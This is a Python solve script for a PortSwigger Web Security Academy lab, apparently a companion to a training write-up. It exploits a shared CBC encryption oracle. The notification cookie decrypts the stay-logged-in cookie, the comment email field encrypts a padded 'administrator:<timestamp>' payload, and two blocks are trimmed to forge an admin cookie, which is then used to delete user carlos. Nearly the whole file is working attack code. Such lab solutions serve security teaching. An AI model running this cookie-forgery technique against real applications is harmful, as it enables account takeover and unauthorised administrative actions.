#!/usr/bin/env python3
"""
Authentication bypass via encryption oracle
PortSwigger Web Security Academy -- Business Logic Vulnerabilities

Companion script for the writeup: 11-authentication-bypass-via-encryption-oracle.md

What this does:
    Logs in with "stay logged in" to obtain the CBC-encrypted stay-logged-in
    cookie, then uses the comment form's `notification` cookie as a
    decryption oracle -- setting notification to the stay-logged-in value
    and reading the reflected plaintext reveals "wiener:<timestamp>" and
    confirms both cookies share a key. It then uses the same cookie as an
    encryption oracle: submitting an invalid comment email of
    "x"*9 + "administrator:<timestamp>" gets the server to encrypt that
    payload behind a fixed 23-byte "Invalid email address: " prefix padded
    to exactly 32 bytes (two AES blocks). Stripping the leading 32 bytes
    (IV + first ciphertext block) from that response leaves a ciphertext
    that decrypts cleanly to "administrator:<timestamp>" on its own. Set as
    the stay-logged-in cookie with no session cookie present, it
    authenticates as administrator.

Usage:
    python 11-authentication-bypass-via-encryption-oracle.py <lab-url>
    e.g. python 11-authentication-bypass-via-encryption-oracle.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import base64 as b64
import re
import sys
from urllib.parse import unquote, urlparse
import httpx


def solve(lab_url: str) -> None:
    domain = urlparse(lab_url).hostname
    c = httpx.Client(follow_redirects=True, timeout=15)

    # 1. Login with "stay logged in"
    login_r = c.get(f"{lab_url}/login")
    csrf = re.search(r'name="csrf"\s+value="([^"]+)"', login_r.text).group(1)
    c.post(f"{lab_url}/login", data={
        "csrf": csrf, "username": "wiener", "password": "peter",
        "stay-logged-in": "on"
    })
    stay_enc = c.cookies.get("stay-logged-in")
    if not stay_enc:
        print("[-] No stay-logged-in cookie was set.")
        return
    print("[*] Got stay-logged-in cookie")

    # 2. Decrypt it via the notification oracle
    c.cookies.set("notification", stay_enc, domain=domain)
    page = c.get(f"{lab_url}/my-account")
    ts_m = re.search(r'wiener:(\d+)', page.text)
    if not ts_m:
        c.cookies.set("notification", stay_enc)
        page = c.get(f"{lab_url}/my-account")
        ts_m = re.search(r'wiener:(\d+)', page.text)
    if not ts_m:
        print("[-] Could not decrypt the stay-logged-in cookie via the notification oracle.")
        return
    timestamp = ts_m.group(1)
    print(f"[*] Decrypted: wiener:{timestamp}")

    # 3. Find a blog post to comment on
    home = c.get(f"{lab_url}/")
    post_m = re.search(r'postId=(\d+)', home.text)
    post_id = post_m.group(1) if post_m else "1"

    # 4. Encrypt "xxxxxxxxxadministrator:timestamp" via the comment email field.
    #    "Invalid email address: " is 23 bytes; 9 padding chars bring it to
    #    32 bytes (two full AES blocks), so our payload starts on a clean
    #    block boundary.
    admin_payload = "x" * 9 + f"administrator:{timestamp}"
    print(f"[*] Payload: {admin_payload}")

    post_r = c.get(f"{lab_url}/post?postId={post_id}")
    csrf = re.search(r'name="csrf"\s+value="([^"]+)"', post_r.text).group(1)

    enc_r = c.post(f"{lab_url}/post/comment", data={
        "csrf": csrf, "postId": post_id,
        "name": "test", "email": admin_payload,
        "comment": "test"
    }, follow_redirects=False)

    notif_enc = None
    for hdr in enc_r.headers.get_list("set-cookie"):
        if "notification=" in hdr:
            notif_enc = hdr.split("notification=")[1].split(";")[0]
            break
    if not notif_enc:
        print("[-] No notification cookie returned from the comment submission.")
        return

    # 5. Strip the first 32 bytes: IV (16) + first ciphertext block (16).
    #    In CBC, removing them makes the former second block the new first
    #    block, decrypting correctly with the former third block as its IV.
    raw = b64.b64decode(unquote(notif_enc))
    print(f"[*] Encrypted response: {len(raw)} bytes, trimming leading 32")
    trimmed = raw[32:]
    forged = b64.b64encode(trimmed).decode()

    # 6. Authenticate as admin with the forged cookie, no session cookie
    c2 = httpx.Client(follow_redirects=True, timeout=15,
                       cookies={"stay-logged-in": forged})
    admin_r = c2.get(f"{lab_url}/admin")
    print(f"[*] /admin -> {admin_r.status_code}, has delete: {'delete' in admin_r.text.lower()}")

    if "delete" not in admin_r.text.lower():
        from urllib.parse import quote
        c3 = httpx.Client(follow_redirects=True, timeout=15,
                           cookies={"stay-logged-in": quote(forged, safe="")})
        admin_r = c3.get(f"{lab_url}/admin")
        c2 = c3

    del_url = re.search(r'href="(/admin/delete\?username=carlos)"', admin_r.text)
    if del_url:
        c2.get(f"{lab_url}{del_url.group(1)}")
        print(f"[*] Deleted carlos via {del_url.group(1)}")

    check = c2.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- forged admin session via the shared CBC encryption oracle.")
    else:
        print("[-] Not solved yet -- inspect whether the forged cookie decrypted cleanly.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
